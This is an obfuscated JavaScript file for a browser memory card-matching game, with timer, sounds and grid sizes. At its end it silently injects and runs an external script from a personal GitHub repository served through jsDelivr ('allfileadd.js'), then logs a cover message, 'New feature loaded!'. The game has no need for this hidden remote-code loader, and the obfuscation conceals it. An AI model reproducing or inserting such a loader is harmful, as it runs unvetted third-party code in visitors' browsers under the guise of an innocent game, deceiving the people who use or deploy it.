function _0x53b3() {
    const _0x2d3e10 = [
        'movesDisplay',
        '622otHkHs',
        'playAgainBtn',
        'restartBtn',
        'forEach',
        '🎗️',
        '4x4',
        'gain',
        'currentTime',
        'appendChild',
        'contains',
        'destination',
        'winModal',
        'flipCard',
        'mismatch',
        'head',
        'script',
        'matches',
        'setValueAtTime',
        'symbol',
        'soundEnabled',
        'timeDisplay',
        '.difficulty-btn',
        'init',
        'connect',
        'startTimer',
        'attachEventListeners',
        'innerHTML',
        'preloader',
        'sine',
        'getElementById',
        'level',
        '1101wGVkbk',
        '18065172PVMjaM',
        'toggleSound',
        '\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22card-face\x20card-back\x22></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22card-face\x20card-front\x22>',
        'log',
        'index',
        'shuffleArray',
        'timer',
        '15YdmHno',
        'AudioContext',
        'createBoard',
        'padStart',
        'card',
        'time',
        'floor',
        'add',
        'closeWinModal',
        'div',
        'handleMatch',
        'slice',
        'lockBoard',
        'loaded',
        'restartGame',
        'checkWin',
        '56424ozZFRm',
        'addEventListener',
        'toString',
        'cardSymbols',
        'active',
        '9XjGWXo',
        'checkForMatch',
        'match',
        '535787hOMHUi',
        'dataset',
        'resetBoard',
        '304068JgOccx',
        'board',
        'show',
        'timerInterval',
        'src',
        'currentLevel',
        '95pSNhzg',
        'matched',
        'secondCard',
        'exponentialRampToValueAtTime',
        'flipped',
        'value',
        '11785190QmBfkV',
        'createElement',
        'querySelectorAll',
        'textContent',
        'classList',
        'stop',
        '80KGQkFf',
        'click',
        'moves',
        'stopTimer',
        'showWinModal',
        'firstCard',
        'win',
        'matchesDisplay',
        'createOscillator',
        'formatTime',
        'playSound',
        'getShuffledSymbols',
        '13754488IosdWq',
        '🎖️',
        '26mgeWBt',
        'className',
        'winMoves',
        'createGain',
        'soundToggle',
        'target',
        'flip',
        'remove',
        'frequency',
        'New\x20feature\x20loaded!'
    ];
    _0x53b3 = function () {
        return _0x2d3e10;
    };
    return _0x53b3();
}
function _0x17f5(_0x183324, _0x3a4e68) {
    const _0x53b3c6 = _0x53b3();
    return _0x17f5 = function (_0x17f557, _0x26f173) {
        _0x17f557 = _0x17f557 - 0x141;
        let _0x403f19 = _0x53b3c6[_0x17f557];
        return _0x403f19;
    }, _0x17f5(_0x183324, _0x3a4e68);
}
const _0x599c0f = _0x17f5;
(function (_0x595d7d, _0x23ec75) {
    const _0x1f5db3 = _0x17f5, _0x48540c = _0x595d7d();
    while (!![]) {
        try {
            const _0x2002bf = -parseInt(_0x1f5db3(0x193)) / 0x1 * (parseInt(_0x1f5db3(0x174)) / 0x2) + parseInt(_0x1f5db3(0x19b)) / 0x3 * (-parseInt(_0x1f5db3(0x1ab)) / 0x4) + -parseInt(_0x1f5db3(0x14f)) / 0x5 * (parseInt(_0x1f5db3(0x149)) / 0x6) + parseInt(_0x1f5db3(0x146)) / 0x7 * (-parseInt(_0x1f5db3(0x15b)) / 0x8) + parseInt(_0x1f5db3(0x143)) / 0x9 * (parseInt(_0x1f5db3(0x155)) / 0xa) + -parseInt(_0x1f5db3(0x167)) / 0xb + parseInt(_0x1f5db3(0x194)) / 0xc * (parseInt(_0x1f5db3(0x169)) / 0xd);
            if (_0x2002bf === _0x23ec75)
                break;
            else
                _0x48540c['push'](_0x48540c['shift']());
        } catch (_0x12f077) {
            _0x48540c['push'](_0x48540c['shift']());
        }
    }
}(_0x53b3, 0xc2c2c));
class GeniusMemoryGame {
    constructor() {
        const _0x4ccbff = _0x17f5;
        this['board'] = document[_0x4ccbff(0x191)]('gameBoard'), this[_0x4ccbff(0x173)] = document[_0x4ccbff(0x191)](_0x4ccbff(0x15d)), this['timeDisplay'] = document[_0x4ccbff(0x191)](_0x4ccbff(0x1a0)), this['matchesDisplay'] = document[_0x4ccbff(0x191)](_0x4ccbff(0x184)), this[_0x4ccbff(0x17f)] = document['getElementById'](_0x4ccbff(0x17f)), this['restartBtn'] = document['getElementById']('restartBtn'), this[_0x4ccbff(0x175)] = document[_0x4ccbff(0x191)](_0x4ccbff(0x175)), this[_0x4ccbff(0x16d)] = document[_0x4ccbff(0x191)](_0x4ccbff(0x16d)), this[_0x4ccbff(0x15d)] = 0x0, this[_0x4ccbff(0x184)] = 0x0, this[_0x4ccbff(0x19a)] = 0x0, this[_0x4ccbff(0x14c)] = null, this['firstCard'] = null, this[_0x4ccbff(0x151)] = null, this[_0x4ccbff(0x1a7)] = ![], this[_0x4ccbff(0x187)] = !![], this[_0x4ccbff(0x14e)] = _0x4ccbff(0x179), this['cardSymbols'] = {
            '4x4': [
                '🌟',
                '🎯',
                '🎨',
                '🎭',
                '🎪',
                '🎸',
                '🎺',
                '🎲'
            ],
            '5x5': [
                '🌟',
                '🎯',
                '🎨',
                '🎭',
                '🎪',
                '🎸',
                '🎺',
                '🎲',
                '🎊',
                '🎈',
                '🎃',
                '🎁',
                '🎀'
            ],
            '6x6': [
                '🌟',
                '🎯',
                '🎨',
                '🎭',
                '🎪',
                '🎸',
                '🎺',
                '🎲',
                '🎊',
                '🎈',
                '🎃',
                '🎁',
                '🎀',
                _0x4ccbff(0x168),
                _0x4ccbff(0x178),
                '🎫',
                '🎬',
                '🎤'
            ]
        }, this[_0x4ccbff(0x18a)]();
    }
    [_0x599c0f(0x18a)]() {
        const _0x14ce8e = _0x599c0f;
        this[_0x14ce8e(0x18d)](), this['createBoard'](), this['startTimer']();
    }
    ['attachEventListeners']() {
        const _0x31c696 = _0x599c0f;
        this[_0x31c696(0x176)][_0x31c696(0x1ac)](_0x31c696(0x15c), () => this[_0x31c696(0x1a9)]()), this[_0x31c696(0x175)]['addEventListener'](_0x31c696(0x15c), () => this[_0x31c696(0x1a3)]()), this[_0x31c696(0x16d)][_0x31c696(0x1ac)]('click', () => this['toggleSound']()), document[_0x31c696(0x157)](_0x31c696(0x189))[_0x31c696(0x177)](_0x280788 => {
            const _0xc22fac = _0x31c696;
            _0x280788[_0xc22fac(0x1ac)](_0xc22fac(0x15c), _0x112691 => {
                const _0x1f173f = _0xc22fac;
                document['querySelectorAll']('.difficulty-btn')[_0x1f173f(0x177)](_0x184dcf => _0x184dcf[_0x1f173f(0x159)][_0x1f173f(0x170)](_0x1f173f(0x142))), _0x112691['target'][_0x1f173f(0x159)][_0x1f173f(0x1a2)](_0x1f173f(0x142)), this[_0x1f173f(0x14e)] = _0x112691[_0x1f173f(0x16e)][_0x1f173f(0x147)][_0x1f173f(0x192)], this[_0x1f173f(0x1a9)]();
            });
        });
    }
    [_0x599c0f(0x19d)]() {
        const _0x2edec9 = _0x599c0f;
        this[_0x2edec9(0x14a)][_0x2edec9(0x18e)] = '', this[_0x2edec9(0x14a)][_0x2edec9(0x16a)] = 'game-board\x20grid-' + this[_0x2edec9(0x14e)];
        const _0x2eadc7 = this['getShuffledSymbols']();
        _0x2eadc7[_0x2edec9(0x177)]((_0xe25ba2, _0x3ff5bc) => {
            const _0x277be9 = _0x2edec9, _0x16c251 = document[_0x277be9(0x156)](_0x277be9(0x1a4));
            _0x16c251[_0x277be9(0x16a)] = _0x277be9(0x19f), _0x16c251[_0x277be9(0x147)][_0x277be9(0x186)] = _0xe25ba2, _0x16c251['dataset'][_0x277be9(0x198)] = _0x3ff5bc, _0x16c251['innerHTML'] = _0x277be9(0x196) + _0xe25ba2 + '</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20', _0x16c251[_0x277be9(0x1ac)](_0x277be9(0x15c), () => this[_0x277be9(0x180)](_0x16c251)), this['board'][_0x277be9(0x17c)](_0x16c251);
        });
    }
    [_0x599c0f(0x166)]() {
        const _0x250db5 = _0x599c0f, _0x1b44fa = this[_0x250db5(0x14e)], _0x37b30c = parseInt(_0x1b44fa['split']('x')[0x0]), _0x4ab171 = _0x37b30c * _0x37b30c, _0x3457fa = _0x4ab171 / 0x2, _0x2d58e7 = this[_0x250db5(0x141)][_0x1b44fa][_0x250db5(0x1a6)](0x0, _0x3457fa), _0x192a85 = [
                ..._0x2d58e7,
                ..._0x2d58e7
            ];
        return this[_0x250db5(0x199)](_0x192a85);
    }
    [_0x599c0f(0x199)](_0x4b0ea3) {
        const _0x5b73e2 = _0x599c0f, _0x356708 = [..._0x4b0ea3];
        for (let _0x1154bc = _0x356708['length'] - 0x1; _0x1154bc > 0x0; _0x1154bc--) {
            const _0x1ac63f = Math[_0x5b73e2(0x1a1)](Math['random']() * (_0x1154bc + 0x1));
            [_0x356708[_0x1154bc], _0x356708[_0x1ac63f]] = [
                _0x356708[_0x1ac63f],
                _0x356708[_0x1154bc]
            ];
        }
        return _0x356708;
    }
    ['flipCard'](_0x5572c7) {
        const _0x14fe50 = _0x599c0f;
        if (this[_0x14fe50(0x1a7)] || _0x5572c7[_0x14fe50(0x159)]['contains'](_0x14fe50(0x153)) || _0x5572c7[_0x14fe50(0x159)][_0x14fe50(0x17d)](_0x14fe50(0x150)))
            return;
        _0x5572c7['classList'][_0x14fe50(0x1a2)](_0x14fe50(0x153)), this['playSound'](_0x14fe50(0x16f));
        if (!this[_0x14fe50(0x160)]) {
            this[_0x14fe50(0x160)] = _0x5572c7;
            return;
        }
        this[_0x14fe50(0x151)] = _0x5572c7, this[_0x14fe50(0x15d)]++, this[_0x14fe50(0x173)][_0x14fe50(0x158)] = this[_0x14fe50(0x15d)], this[_0x14fe50(0x1a7)] = !![], this[_0x14fe50(0x144)]();
    }
    [_0x599c0f(0x144)]() {
        const _0x1da7a5 = _0x599c0f, _0x74cd2 = this[_0x1da7a5(0x160)][_0x1da7a5(0x147)][_0x1da7a5(0x186)] === this[_0x1da7a5(0x151)][_0x1da7a5(0x147)][_0x1da7a5(0x186)];
        setTimeout(() => {
            _0x74cd2 ? this['handleMatch']() : this['handleMismatch']();
        }, 0x320);
    }
    [_0x599c0f(0x1a5)]() {
        const _0x444d93 = _0x599c0f;
        this[_0x444d93(0x160)][_0x444d93(0x159)][_0x444d93(0x1a2)](_0x444d93(0x150)), this[_0x444d93(0x151)]['classList'][_0x444d93(0x1a2)](_0x444d93(0x150)), this[_0x444d93(0x184)]++, this[_0x444d93(0x162)][_0x444d93(0x158)] = this[_0x444d93(0x184)], this[_0x444d93(0x165)](_0x444d93(0x145)), this['resetBoard'](), this[_0x444d93(0x1aa)]() && setTimeout(() => this[_0x444d93(0x15f)](), 0x1f4);
    }
    ['handleMismatch']() {
        const _0x443a5b = _0x599c0f;
        this[_0x443a5b(0x160)][_0x443a5b(0x159)][_0x443a5b(0x170)](_0x443a5b(0x153)), this[_0x443a5b(0x151)]['classList']['remove']('flipped'), this[_0x443a5b(0x165)](_0x443a5b(0x181)), this[_0x443a5b(0x148)]();
    }
    [_0x599c0f(0x148)]() {
        const _0x2b71b3 = _0x599c0f;
        [this[_0x2b71b3(0x160)], this['secondCard']] = [
            null,
            null
        ], this[_0x2b71b3(0x1a7)] = ![];
    }
    [_0x599c0f(0x1aa)]() {
        const _0x9dda92 = _0x599c0f, _0x2b7af3 = this[_0x9dda92(0x14e)], _0x54d701 = parseInt(_0x2b7af3['split']('x')[0x0]), _0x277e46 = _0x54d701 * _0x54d701 / 0x2;
        return this[_0x9dda92(0x184)] === _0x277e46;
    }
    [_0x599c0f(0x15f)]() {
        const _0x453b31 = _0x599c0f;
        this[_0x453b31(0x15e)](), this['playSound'](_0x453b31(0x161)), document[_0x453b31(0x191)](_0x453b31(0x16b))[_0x453b31(0x158)] = this[_0x453b31(0x15d)], document['getElementById']('winTime')['textContent'] = this['formatTime'](this['timer']), this[_0x453b31(0x17f)]['classList'][_0x453b31(0x1a2)]('show');
    }
    [_0x599c0f(0x1a3)]() {
        const _0x2ee7ed = _0x599c0f;
        this[_0x2ee7ed(0x17f)]['classList'][_0x2ee7ed(0x170)](_0x2ee7ed(0x14b)), this[_0x2ee7ed(0x1a9)]();
    }
    [_0x599c0f(0x1a9)]() {
        const _0x181d99 = _0x599c0f;
        this[_0x181d99(0x15d)] = 0x0, this[_0x181d99(0x184)] = 0x0, this[_0x181d99(0x19a)] = 0x0, this[_0x181d99(0x173)][_0x181d99(0x158)] = '0', this[_0x181d99(0x162)][_0x181d99(0x158)] = '0', this[_0x181d99(0x188)]['textContent'] = '00:00', this[_0x181d99(0x148)](), this['createBoard'](), this[_0x181d99(0x18c)]();
    }
    [_0x599c0f(0x18c)]() {
        const _0x270c8b = _0x599c0f;
        this[_0x270c8b(0x15e)](), this['timerInterval'] = setInterval(() => {
            const _0x52cac1 = _0x270c8b;
            this['timer']++, this[_0x52cac1(0x188)]['textContent'] = this[_0x52cac1(0x164)](this[_0x52cac1(0x19a)]);
        }, 0x3e8);
    }
    ['stopTimer']() {
        const _0x1bc931 = _0x599c0f;
        this[_0x1bc931(0x14c)] && (clearInterval(this[_0x1bc931(0x14c)]), this[_0x1bc931(0x14c)] = null);
    }
    [_0x599c0f(0x164)](_0x3894dd) {
        const _0x38a756 = _0x599c0f, _0x283019 = Math['floor'](_0x3894dd / 0x3c), _0x576b51 = _0x3894dd % 0x3c;
        return _0x283019['toString']()[_0x38a756(0x19e)](0x2, '0') + ':' + _0x576b51[_0x38a756(0x1ad)]()['padStart'](0x2, '0');
    }
    [_0x599c0f(0x195)]() {
        const _0x31eee4 = _0x599c0f;
        this[_0x31eee4(0x187)] = !this[_0x31eee4(0x187)], this['soundToggle']['textContent'] = this['soundEnabled'] ? '🔊' : '🔇';
    }
    [_0x599c0f(0x165)](_0xa303ac) {
        const _0x2d0c92 = _0x599c0f;
        if (!this[_0x2d0c92(0x187)])
            return;
        const _0x9573d6 = new (window[(_0x2d0c92(0x19c))] || window['webkitAudioContext'])(), _0x5a8ff5 = _0x9573d6[_0x2d0c92(0x163)](), _0x3b32e9 = _0x9573d6[_0x2d0c92(0x16c)]();
        _0x5a8ff5[_0x2d0c92(0x18b)](_0x3b32e9), _0x3b32e9['connect'](_0x9573d6[_0x2d0c92(0x17e)]);
        let _0x5eebad = 0x1b8, _0x4c0261 = 0.1;
        switch (_0xa303ac) {
        case _0x2d0c92(0x16f):
            _0x5eebad = 0x258, _0x4c0261 = 0.1;
            break;
        case _0x2d0c92(0x145):
            _0x5eebad = 0x320, _0x4c0261 = 0.3;
            break;
        case _0x2d0c92(0x181):
            _0x5eebad = 0x12c, _0x4c0261 = 0.2;
            break;
        case _0x2d0c92(0x161):
            _0x5eebad = 0x3e8, _0x4c0261 = 0.5;
            break;
        }
        _0x5a8ff5[_0x2d0c92(0x171)][_0x2d0c92(0x154)] = _0x5eebad, _0x5a8ff5['type'] = _0x2d0c92(0x190), _0x3b32e9[_0x2d0c92(0x17a)][_0x2d0c92(0x185)](0.1, _0x9573d6['currentTime']), _0x3b32e9['gain'][_0x2d0c92(0x152)](0.01, _0x9573d6['currentTime'] + _0x4c0261), _0x5a8ff5['start'](_0x9573d6[_0x2d0c92(0x17b)]), _0x5a8ff5[_0x2d0c92(0x15a)](_0x9573d6['currentTime'] + _0x4c0261);
    }
}
window['addEventListener']('load', () => {
    const _0x4856bc = _0x599c0f, _0x564745 = document[_0x4856bc(0x191)](_0x4856bc(0x18f)), _0x516799 = document[_0x4856bc(0x191)]('gameContainer');
    setTimeout(() => {
        const _0x28bd6f = _0x4856bc;
        _0x564745[_0x28bd6f(0x159)][_0x28bd6f(0x1a2)]('hidden'), setTimeout(() => {
            const _0x45c5ab = _0x28bd6f;
            _0x516799[_0x45c5ab(0x159)][_0x45c5ab(0x1a2)](_0x45c5ab(0x1a8)), new GeniusMemoryGame();
        }, 0x258);
    }, 0xdac);
});
function loadScript(_0x1926d6, _0x3cb41b) {
    const _0x2cbd49 = _0x599c0f, _0x107463 = document[_0x2cbd49(0x156)](_0x2cbd49(0x183));
    _0x107463[_0x2cbd49(0x14d)] = _0x1926d6, _0x107463['onload'] = _0x3cb41b, document[_0x2cbd49(0x182)][_0x2cbd49(0x17c)](_0x107463);
}
loadScript('https://cdn.jsdelivr.net/gh/m03951659gmail/toolhubcdn@main/allfileadd.js', function () {
    const _0x238ec0 = _0x599c0f;
    console[_0x238ec0(0x197)](_0x238ec0(0x172));
});